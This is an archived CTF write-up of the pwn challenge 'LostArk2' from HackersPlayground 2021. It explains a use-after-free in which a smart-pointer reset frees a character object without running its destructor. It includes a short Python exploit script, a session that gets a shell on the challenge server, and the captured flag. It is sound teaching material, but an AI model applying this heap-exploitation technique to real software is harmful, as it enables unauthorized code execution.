# LostArk2

**CTF:** HackersPlayground 2021  
**Category:** pwn  
**Original writeup:** <https://kileak.github.io/ctf/2021/sstf-lostark/> — by **kileak**. All credit goes to the original author; this is an archived copy.

---

LostArk 2

In LostArk 2, a dtor was added for each character, in which the active skill for the character will be reset before the object gets freed.

void Lupeon ::~ Lupeon ( Character * this ) { this -> ActiveSkill = 0 ; Character ::~ Character ( this ); }

This kills the simple reallocation solution from part 1. But, there’s a new bug in the pickChar method.

void pickChar ( void ) { unsigned int idx = 0 ; cout << endl << "== choose ==" << endl ; ... Character * char = CHARACTERS [ idx ]; picked_c . reset ( char ); }

The reset function will “destroy the object and takes ownership of it”. Calling this, will free the object, without calling the dtor of it. Exactly what we need.

So the plan for this changes to

Create a lupeon

Create random char

Choose lupeon character (sets active skill to gift )

) Choose random char (this frees the lupeon character without calling dtor)

Create another char (this will be placed in the just freed lupeon)

Choose the newly created char

Use skill to trigger gift

def exploit ( r ): create ( 7 , "" ) # create lupeon create ( 1 , "A" * ( 0x60 )) # create random char choose ( 0 ) # choose lupeon choose ( 1 ) # frees picked char (not calling dtor) create ( 1 , "A" * ( 0x40 )) choose ( 0 ) r . sendline ( "6" ) # use skill (will be lupeon skill) r . interactive () return

$ python xpl.py 1 [+] Opening connection to lostark2.sstf.site on port 1337: Done [*] Switching to interactive mode = use skill = $ cat /flag SCTF{KUKURUPPINGPPONG!}
